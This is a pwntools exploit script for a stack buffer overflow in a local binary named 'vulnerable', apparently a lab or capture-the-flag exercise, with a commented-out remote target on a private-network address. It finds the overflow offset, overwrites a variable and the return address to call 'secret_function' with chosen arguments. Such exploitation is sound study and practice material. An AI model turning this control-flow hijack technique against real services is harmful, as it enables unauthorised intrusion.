from pwn import *

HOST = '192.168.56.109'
PORT = 9108

# Get the offset from the buffer to the port variable
pattern = cyclic(100)
print(pattern)

index = cyclic_find(0x6161616861616167) # Sequence returned in the port variable output
print(index)

# Pack the address into a 64-bit little-endian format
vuln = ELF('./vulnerable')
packed_address = p64(vuln.symbols['secret_function'])
print(packed_address)

# Construct the payload
payload = b"A"*index + b'\xFF'*8 # port variable
payload += b"A"*8 # padding
payload += packed_address # return address
payload += b"A"*8 # padding
payload += b"\x12" + b"\x00"*7 # arg1
payload += b"A"*8 # padding
payload += b"\x14" + b"\x00"*7 # arg2

# Print the payload in a format that shows the byte values
print("Payload to trigger buffer overflow:")
print(payload)

# Execute the vulnerable program and send the payload
p = process('./vulnerable')
# p = remote(HOST, PORT)
p.sendline(payload)
print(p.recvall())